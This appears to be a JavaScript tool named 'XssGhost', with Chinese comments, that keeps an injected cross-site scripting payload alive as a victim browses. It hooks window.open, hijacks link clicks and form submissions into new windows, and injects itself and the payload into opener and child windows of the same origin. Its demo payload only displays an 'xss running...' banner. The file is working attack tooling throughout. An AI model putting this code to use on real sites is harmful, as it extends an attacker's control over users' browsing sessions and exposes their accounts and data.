var XssGhost = function() {

	function module(id, payload, winList, first) {
		var window = this;
		// debug
		window.addEventListener('error', function(e) {
			alert('err: ' + e.message);
		});

		// 使用副本
		winList = winList.concat();

		function globalCall(win, code, args) {
			code = '(' + code + ').apply(this,arguments)';
			if (!win.Function) {
				return false;
			}
			var fn = win.Function(code);
			fn.apply(null, args || []);
			return true;
		}

		//
		// 弹窗钩子
		//
		var mFnWinOpen = window.open;

		window.open = function(url) {
			var win = mFnWinOpen.apply(this, arguments);
			if (win) {
				if (!url || /about:blank/i.test(url)) {
					win.__xss_blank = true;
				}
				welcome(win);
			}
			return win;
		};

		// 获取当前<a>元素
		function getAnchorElem(e) {
			var el = e.target;
			do {
				if (el.tagName == 'A') {
					return el;
				}
				el = el.parentNode;
			} while (el != document);
		}

		// 超链接劫持
		function clickHandler(e) {
			if (e.defaultPrevented) {
				return;
			}
			var link = getAnchorElem(e);
			if (!link) {
				return;
			}
			if (!/http|about/.test(link.protocol)) {
				return;
			}
			// 屏蔽默认行为，模拟弹窗
			e.preventDefault();
			open(link.href);
		}

		// 表单劫持
		function submitHandler(e) {
			if (e.defaultPrevented) {
				return;
			}
			// 在新页面中提交
			var name = '$' + Math.random();
			var win = open('', name);
			var form = e.target;
			form.target = name;
		}

		// 通知大家，有新页面加入
		function broadcast(win) {
			enumWinList(function(v) {
				var notify;
				try {
					notify = v.__xss_notify;
				} catch (e) {}

				if (notify) {
					notify(win);
				}
			});
		}

		// broadcast 通知接口
		window.__xss_notify = function(win) {
			var exist;
			enumWinList(function(v) {
				if (v == win) {
					exist = true;
					return false;
				}
			});
			if (!exist) {
				winList.push(win);
			}
		};

		// 更新所有 Window
		function update() {
			var newList = [];

			// 刷新列表，过滤关闭的窗体
			enumWinList(function(v) {
				if (v != window) {
					check(v);
				}
				newList.push(v);
			});
			winList = newList;
			//console.log(winList.length)
		}

		function enumWinList(callback) {
			var n;
			try {
				// IE 下各种异常
				n = winList.length;
			} catch (e) {
				//alert('shit:' + e);
				return;
			}

			for (var i = 0; i < n; i++) {
				var win;
				try {
					win = winList[i];
					if (win.closed) {
						continue;
					}
				} catch (e) {
					//alert('fuck:' + e);
					continue;
				}
				if (callback(win) === false) {
					break;
				}
			}
		}

		// 新页面加入
		function welcome(win) {
			//
			// 不同源的 Window 也可以先关注起来，
			// 以后转到同源的页面里，仍可控制
			//
			broadcast(win);
			check(win);
		}

		function isLoadingPage(win) {
			return win.location.href == 'about:blank' && !win.__xss_blank;
		}

		function isSameOrigin(win) {
			try {
				return !!win.Function;
			} catch (e) {
				return false;
			}
		}

		// 检测指定的窗口
		function check(win) {
			if (!isSameOrigin(win)) {
				return;
			}
			if (id in win) {
				return; // 已初始化
			}

			// 注入当前模块到新 Window
			if (!win.__xss_injected) {
				var args = [
					id,
					payload,
					winList
				];
				if (!globalCall(win, module, args)) {
					return;
				}
				win.__xss_injected = true;
			}

			// 过渡页
			if (isLoadingPage(win)) {
				return;
			}

			// 过渡完成，正式初始化
			var fnInit = win.__xss_init;
			if (fnInit) {
				fnInit();
				// 标记已注入
				win[id] = true;
			}
		}

		// 正式初始化
		window.__xss_init = function() {
			// 执行 XSS 代码
			globalCall(window, payload);
			// 定时检测页面
			setInterval(update, 1000);
			document.addEventListener('click', clickHandler);
			document.addEventListener('submit', submitHandler);
		};


		// 关注退出消息
		window.addEventListener('message', function(e) {
			if (e.data == 'bye') {
				e.stopImmediatePropagation();
				//console.warn('bye');
				update();
			}
		}, true);

		// 页面退出事件（刷新或关闭）
		window.addEventListener('unload', function() {
			// 通知其他页面
			enumWinList(function(v) {
				if (v != window) {
					try {
						v.postMessage('bye', '*');
					} catch (e) {}
				}
			});
		});

		function injectParent() {
			var win = window;
			while (win = win.parent) {
				welcome(win);
			}
		}

		//
		// 注入来源页
		//   opener 可能不同源，
		//   但若 opner.opener 同源，仍然可以控制
		//
		function injectOpener() {
			var win = window;
			for (;;) {
				try {
					win = win.opener;
				} catch (e) {
					//alert('fail get opener', e);
					break;
				}
				if (!win) {
					break;
				}
				welcome(win);
			}
		}

		// 注入相关页面
		if (first) {
			__xss_init();

			if (self == top) {
				injectOpener();
			} else {
				// FIX ME
				//injectParent();
			}
		}
	}


	function init(opt) {
		// 不考虑老 IE 浏览器了
		if (!window.addEventListener) {
			return;
		}

		var id = '__xss_id_' + opt.id;
		if (id in window) {
			return;
		}
		window[id] = true;

		var payload = opt.payload;
		payload();

		module(id, payload + '', [window], true);
	}

	return {
		init: init
	};
}();


// test
XssGhost.init({
	id: 'test1',
	payload: function() {
		//console.warn('xss run');

		function show() {
			var div = document.createElement('div');
			div.innerHTML = 'xss running...';
			div.style.cssText = 'position:fixed; top:0; right:0; color:red; background:#000; font-size:40px; line-height:40px; z-index:999999';
			document.body.appendChild(div);
		}

		if (document.readyState == 'complete') {
			show();
		} else {
			window.addEventListener('DOMContentLoaded', show);
		}
	}
});
